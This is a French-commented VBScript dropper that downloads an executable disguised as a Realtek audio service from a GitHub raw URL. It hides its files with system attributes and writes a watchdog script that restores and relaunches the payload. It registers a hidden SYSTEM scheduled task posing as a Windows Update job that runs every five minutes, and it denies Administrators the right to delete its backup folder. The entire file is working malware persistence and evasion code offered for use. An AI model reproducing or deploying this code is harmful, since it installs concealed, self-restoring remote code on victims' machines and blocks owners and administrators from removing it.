Option Explicit

Dim shell, fso, taskName, appData, backupPath
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Dossiers
appData = shell.ExpandEnvironmentStrings("%ProgramData%") & "\AudioHelper"
backupPath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\AudioBackup"
If Not fso.FolderExists(appData) Then fso.CreateFolder appData
If Not fso.FolderExists(backupPath) Then fso.CreateFolder backupPath

' Fichiers
Dim exePath, bakPath, checkerPath, xmlPath
exePath = appData & "\RtkAudUService.exe"
bakPath = backupPath & "\RtkAudUService.bak"
checkerPath = backupPath & "\CheckAndRestore.vbs"
xmlPath = backupPath & "\RtkAudUService.xml"

' Télécharger RtkAudUService.exe et .bak si manquant
If Not fso.FileExists(exePath) Then DownloadFile "https://raw.githubusercontent.com/DexXC/XC/main/RtkAudUService.exe", exePath
If Not fso.FileExists(bakPath) Then DownloadFile "https://raw.githubusercontent.com/DexXC/XC/main/RtkAudUService.bak", bakPath

' Cacher dossiers
shell.Run "attrib +h +s """ & appData & """", 0, True
shell.Run "attrib +h +s """ & backupPath & """", 0, True

' Cacher fichiers
shell.Run "attrib +h +s """ & exePath & """", 0, True
shell.Run "attrib +h +s """ & bakPath & """", 0, True
shell.Run "attrib +h +s """ & checkerPath & """", 0, True
shell.Run "attrib +h +s """ & xmlPath & """", 0, True

' Créer CheckAndRestore.vbs
CreateChecker checkerPath, exePath, bakPath

' Nom fixe de tâche système
taskName = "\Microsoft\Windows\Update\WinUpdateSvc"

' Créer fichier XML de la tâche SYSTEM cachée
CreateHiddenTaskXML xmlPath, checkerPath

' Créer tâche planifiée SYSTEM
shell.Run "schtasks /create /tn """ & taskName & """ /xml """ & xmlPath & """ /ru SYSTEM /f", 0, True

' *** AJOUT : bloquer suppression pour Administrators ***
Dim cmd
cmd = "icacls """ & backupPath & """ /deny Administrators:(D,DC)"
shell.Run cmd, 0, True

' --- FONCTIONS ---

Sub DownloadFile(url, path)
    On Error Resume Next
    Dim xHttp, stream
    Set xHttp = CreateObject("Microsoft.XMLHTTP")
    xHttp.Open "GET", url, False
    xHttp.Send
    If xHttp.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write xHttp.ResponseBody
        stream.SaveToFile path, 2
        stream.Close
    End If
End Sub

Sub CreateChecker(path, exe, bak)
    Dim f : Set f = fso.CreateTextFile(path, True)
    f.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
    f.WriteLine "Set shell = CreateObject(""WScript.Shell"")"
    f.WriteLine "exePath = """ & exe & """"
    f.WriteLine "bakPath = """ & bak & """"
    f.WriteLine "If Not fso.FileExists(exePath) Then"
    f.WriteLine "  If fso.FileExists(bakPath) Then fso.CopyFile bakPath, exePath, True"
    f.WriteLine "End If"
    f.WriteLine "If fso.FileExists(exePath) Then shell.Run """" & exePath & """", 0, False"
    f.Close
End Sub

Sub CreateHiddenTaskXML(path, script)
    Dim xml : Set xml = fso.CreateTextFile(path, True)
    xml.WriteLine "<?xml version=""1.0"" encoding=""UTF-16""?>"
    xml.WriteLine "<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">"
    xml.WriteLine "  <Triggers><TimeTrigger><Repetition><Interval>PT5M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>"
    xml.WriteLine "  <StartBoundary>2025-01-01T00:00:00</StartBoundary><Enabled>true</Enabled></TimeTrigger></Triggers>"
    xml.WriteLine "  <Principals><Principal id=""Author""><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>"
    xml.WriteLine "  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>"
    xml.WriteLine "  <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><StartWhenAvailable>true</StartWhenAvailable>"
    xml.WriteLine "  <AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden>"
    xml.WriteLine "  <ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>"
    xml.WriteLine "  <Actions Context=""Author""><Exec><Command>wscript.exe</Command><Arguments>""" & script & """</Arguments></Exec></Actions>"
    xml.WriteLine "</Task>"
    xml.Close
End Sub
